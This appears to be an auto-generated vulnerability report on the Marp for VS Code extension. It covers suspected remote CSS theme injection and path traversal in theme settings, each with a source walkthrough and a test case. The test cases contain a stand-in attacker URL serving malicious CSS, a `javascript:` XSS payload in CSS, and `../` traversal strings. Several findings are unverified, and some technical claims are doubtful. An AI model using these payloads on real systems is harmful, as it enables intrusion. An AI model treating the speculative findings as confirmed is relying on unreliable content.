### Vulnerability List

* Vulnerability Name: Remote Theme CSS Injection
* Description:
    1. An attacker can trick a user into adding a malicious remote CSS URL to the `markdown.marp.themes` setting in VS Code.
    2. When Marp for VS Code processes a Marp Markdown document, it fetches and applies the CSS from the attacker-controlled remote URL.
    3. A malicious CSS file can contain JavaScript code embedded within CSS directives like `url('javascript:...')` or `behavior: url(...)` (though `behavior` is less likely to be supported in this context, `url()` is more relevant).
    4. When the VS Code preview renders the Marp slide deck, this embedded JavaScript code within the malicious CSS can be executed within the context of the VS Code extension's preview.
    5. This can lead to arbitrary code execution within the VS Code environment, potentially allowing the attacker to access sensitive information, manipulate the VS Code editor, or perform other malicious actions within the user's VS Code session.
* Impact: High. Arbitrary code execution within the VS Code extension context. This could lead to:
    - Exfiltration of sensitive data from the workspace.
    - Modification of workspace files.
    - Abuse of VS Code API to perform actions on behalf of the user.
    - Installation of malicious extensions or further exploitation.
* Vulnerability Rank: High
* Currently Implemented Mitigations:
    - Workspace Trust: The documentation mentions Workspace Trust restricts "features that may met malicious". However, it's unclear if loading remote themes is restricted in untrusted workspaces.  The documentation only states "Marp for VS Code is available even if the current workspace is not trusted but you can use only a basic Marp preview and IntelliSense." which implies custom themes might still be loaded.
    - Content Security Policy (CSP): It's not explicitly mentioned if a Content Security Policy is in place to restrict the capabilities of loaded CSS and prevent execution of embedded JavaScript.
* Missing Mitigations:
    - Content Security Policy (CSP): Implement a strict CSP for the Marp preview to prevent the execution of JavaScript embedded in CSS or other untrusted resources.
    - Remote Theme URL Validation: Implement validation and sanitization of remote theme URLs to ensure they point to legitimate CSS resources and not to arbitrary content that could contain exploits. Potentially restrict allowed schemes to `https`.
    - Workspace Trust Integration: Explicitly document and enforce Workspace Trust restrictions for loading remote themes. In untrusted workspaces, either disable remote theme loading entirely or provide a very clear warning and require explicit user consent before loading remote themes.
    - Subresource Integrity (SRI): Consider implementing SRI for remote themes to ensure that the fetched CSS file has not been tampered with.
* Preconditions:
    - The user must have Marp for VS Code extension installed.
    - The user must manually add a malicious remote CSS URL to the `markdown.marp.themes` setting in their VS Code settings. This could be achieved through social engineering or by tricking the user into opening a workspace with a malicious `.vscode/settings.json` file.
    - Workspace Trust might need to be enabled if it restricts this feature in untrusted workspaces (needs verification).
* Source Code Analysis:
    1. File: `/code/src/themes.ts`
    2. Function `Themes.loadStyles(rootUri: Uri | undefined)` is responsible for loading themes.
    3. It calls `this.getPathsFromConf(rootUri)` to get theme paths from configuration.
    4. `this.normalizePaths` processes the paths and identifies remote URLs.
    5. `this.registerTheme(themeUri)` is called for each theme URI.
    6. For remote themes (identified by `isRemotePath`), `readFile` is called, which in turn uses `utils.fetch` to fetch the CSS content.
    7. File: `/code/src/utils.ts`
    8. `utils.fetch` uses `fetch-ponyfill` to fetch the content from the URL.
    9. File: `/code/src/extension.ts`
    10. In `extendMarkdownIt`, custom themes are loaded via `themes.loadStyles(baseFolder)`.
    11. The fetched CSS content is added to `marp.themeSet` via `marp.themeSet.add(theme.css)`.
    12. Marp Core then applies this CSS to the rendered slide deck.
    13. **Vulnerability Point:** The fetched CSS is directly added to Marp Core's theme set and applied in the preview without any sanitization or CSP, which can allow execution of malicious code embedded in the CSS.

* Security Test Case:
    1. Create a malicious CSS file (e.g., `malicious-theme.css`) hosted on a publicly accessible web server (e.g., `https://attacker.example.com/malicious-theme.css`). This CSS file should contain a CSS directive that attempts to execute JavaScript, for example using `url('javascript:alert("XSS")')` within a CSS property like `list-style-image`.
    2. Open VS Code and navigate to the settings (`Ctrl+,` or `Cmd+,`).
    3. Search for `markdown.marp.themes` and click "Edit in settings.json".
    4. Add the following line to your `settings.json` array: `"https://attacker.example.com/malicious-theme.css"`. Save the settings.json file.
    5. Create a new Marp Markdown file or open an existing one with `marp: true` in the front-matter.
    6. Open the preview of the Marp Markdown file (`Ctrl+Shift+V` or `Cmd+Shift+V`).
    7. Observe if the JavaScript code embedded in the malicious CSS is executed. A successful exploitation would typically manifest as an alert box appearing in the VS Code preview window, or other unexpected behavior indicating JavaScript execution.
    8. Examine the VS Code console (`Help` -> `Toggle Developer Tools` -> `Console`) for any error messages or signs of malicious script execution.

* Vulnerability Name: Local Theme CSS Path Traversal
* Description:
    1. An attacker, with write access to the user's workspace (or by tricking the user into opening a workspace containing a malicious `.vscode/settings.json`), can configure the `markdown.marp.themes` setting to include a path that attempts to traverse outside the intended theme directory.
    2. If Marp for VS Code does not properly sanitize or validate the provided local theme paths, it might be possible to use path traversal sequences like `../` to access and load CSS files from locations outside the workspace or intended theme folder.
    3. By crafting a malicious theme CSS at an arbitrary location within the user's file system (assuming the attacker has some way to place a file there, or targets a known location), and then using path traversal to load it as a custom theme, the attacker can potentially achieve local file read within the VS Code extension's context.
    4. While direct arbitrary code execution might be less likely with CSS loaded from the local filesystem compared to remote CSS injection, the ability to read arbitrary files within the user's workspace or even beyond, depending on the extent of the path traversal vulnerability, is still a significant security risk.
* Impact: High. Local file read vulnerability, potentially leading to:
    - Disclosure of sensitive information from the workspace or file system.
    - Information leakage that could be used for further attacks.
* Vulnerability Rank: High
* Currently Implemented Mitigations:
    - `normalizePaths` function in `/code/src/themes.ts` attempts to prevent directory traversal. It checks if `targetUri.path.startsWith(rootUri.path)` to prevent accessing paths outside the workspace root URI.
* Missing Mitigations:
    - More Robust Path Sanitization: Strengthen path sanitization in `normalizePaths` to handle various path traversal techniques and edge cases. Ensure canonicalization of paths to prevent bypasses.
    - Workspace Trust Integration: Workspace Trust might implicitly mitigate this by restricting access to local file system resources in untrusted workspaces, but this needs to be explicitly verified and documented.
* Preconditions:
    - The user must have Marp for VS Code extension installed.
    - The attacker needs write access to the user's workspace to modify `.vscode/settings.json` or convince the user to open a workspace containing a malicious `.vscode/settings.json` file.
    - Workspace Trust might need to be disabled or the workspace trusted for the vulnerability to be fully exploitable (needs verification).
* Source Code Analysis:
    1. File: `/code/src/themes.ts`
    2. Function `Themes.normalizePaths(paths: string[], rootUri: Uri | undefined)` is intended to normalize and validate theme paths.
    3. It iterates through provided paths and checks if they are remote paths.
    4. For local paths, it uses `Uri.joinPath(rootUri, p)` to resolve the path relative to the workspace root URI (`rootUri`).
    5. **Mitigation Point:** It then checks `if (targetUri.path.startsWith(rootUri.path))` to prevent directory traversal.
    6. **Vulnerability Point:** The effectiveness of `startsWith` based path traversal prevention needs to be rigorously reviewed. There might be bypasses depending on how paths are resolved and compared, especially with different path separators, symbolic links, or case sensitivity issues on different operating systems.

* Security Test Case:
    1. Create a workspace and within it, create a folder named `themes`. Inside `themes`, place a benign CSS file (e.g., `benign-theme.css`).
    2. Create another file at the workspace root named `sensitive-data.txt` containing some sensitive information.
    3. Create a malicious CSS file (e.g., `malicious-theme.css`) at the workspace root. This CSS file should attempt to read the content of `sensitive-data.txt` and somehow exfiltrate it (e.g., attempt to include its content as a background image URL, which might reveal file content in error messages or network requests, although direct exfiltration via CSS alone is limited). For simplicity, let's focus on verifying if the file can be accessed.
    4. Modify the `.vscode/settings.json` in the workspace to include a path traversal sequence in `markdown.marp.themes`. For example, add `"../malicious-theme.css"` or `"themes/../malicious-theme.css"`.
    5. Open a Marp Markdown file in the workspace and ensure `marp: true` is in the front-matter.
    6. Open the preview of the Marp Markdown file.
    7. Check if the CSS from `malicious-theme.css` at the workspace root is loaded and applied, instead of or in addition to the intended themes from the `themes` folder.
    8. Attempt more complex path traversal sequences like `"themes/../../malicious-theme.css"` to see if you can access files even further outside the workspace.
    9. Monitor file system access or VS Code logs to determine if files outside the intended theme directory are being accessed by the extension when loading custom themes.
